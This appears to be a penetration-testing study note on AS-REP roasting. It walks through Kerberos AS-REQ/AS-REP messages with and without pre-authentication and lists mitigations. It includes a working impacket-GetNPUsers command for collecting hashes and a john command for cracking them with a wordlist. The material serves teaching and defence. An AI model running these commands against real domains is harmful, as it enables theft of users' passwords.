AS-REP roasting is an attack against Kerberos that allows password hashes to be retrieved for users that do not require Pre-authentication.

- Some accounts may be configured not to require pre-authentication (e.g., service accounts or old accounts). 

- For these accounts, the KDC will directly respond to an AS-REQ (Authentication Service Request) with an AS-REP message.


### Normal Authentication Flow When PreAuth is Enabled For a User

#### AS REQ

```
Kerberos AS-REQ
    pvno: 5
    msg-type: krb-as-req (10)
    padata: 1 item
        PA-DATA
            padata-type: PA-ENC-TIMESTAMP (2)
            padata-value (Encrypted): 
                Encryption Type: aes256-cts-hmac-sha1-96
                Encrypted Data: 7a3f8e... (AES-encrypted timestamp)
    req-body
        kdc-options: forwardable, renewable
        cname: bob@DOMAIN.HTB
        realm: DOMAIN.HTB
        sname: krbtgt/DOMAIN.HTB
        nonce: 12345678
        etype: aes256-cts, aes128-cts, rc4-hmac

```

- padata: (Pre Auth Data) Current TImeStamp Encrypted with User's Password hash
#### AS REP

```
Kerberos AS-REP
    pvno: 5
    msg-type: krb-as-rep (11)
    ticket
        tkt-vno: 5
        realm: DOMAIN.HTB
        sname: krbtgt/DOMAIN.HTB
        enc-part (Encrypted with KDC key): aes256-cts-hmac-sha1-96
            (Decrypted contents: session key, client principal, expiry, etc.)
    enc-part (Encrypted with user's key): aes256-cts-hmac-sha1-96
        ciphertext: a3d1f5... (long hex string)
        (Decrypted contents: session key, nonce, flags, etc.)
```

- ticket: TGT, encrypted with KDC's key (krbtgt account hash)
- enc-part: session key, encrypted with the user’s password hash, (we need this session key when requesting Service Tickets)

### Authentication Flow When PreAuth is Disabled For a User.
#### AS REQ

```
Kerberos AS-REQ
    pvno: 5
    msg-type: krb-as-req (10)
    req-body
        kdc-options: forwardable, renewable
        cname: bob@DOMAIN.HTB
        realm: DOMAIN.HTB
        sname: krbtgt/DOMAIN.HTB
        nonce: 12345678
        etype: aes256-cts, aes128-cts, rc4-hmac
```

- No padata field: This is the key indicator that pre-authentication is disabled
- cname: name of the user
#### AS REP 

```
Kerberos AS-REP
    pvno: 5
    msg-type: krb-as-rep (11)
    ticket
        tkt-vno: 5
        realm: DOMAIN.HTB
        sname: krbtgt/DOMAIN.HTB
        enc-part (Encrypted with KDC key): aes256-cts-hmac-sha1-96
            (Decrypted contents: session key, client principal, expiry, etc.)
    enc-part (Encrypted with user's key): aes256-cts-hmac-sha1-96
         ciphertext: a3d1f5... (long hex string)
        (Decrypted contents: session key, nonce, flags, etc.)
```

- ticket: TGT, encrypted with KDC's key (krbtgt account hash)
- enc-part: session key, encrypted with the user’s password hash

Now an attacker can perform offline password brute force attack to decrypt this enc-part cipher text and get the user password.

```
$krb5asrep$18$bob@DOMAIN.HTB:a3d1f5...
```

```
impacket-GetNPUsers -dc-ip X.X.X.X doamin.local/ -usersfile users.txt -format john -outputfile hashes
```

```
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
```

### Mitigation

1. **Enforce Pre-Authentication**: Ensure that all user accounts require pre-authentication.
2. **Strong Password Policies**: Implement and enforce strong password policies to make brute-force attacks more difficult.
3. **Monitoring and Alerts**: Monitor for unusual authentication requests and alert on suspicious activity related to AS-REP requests.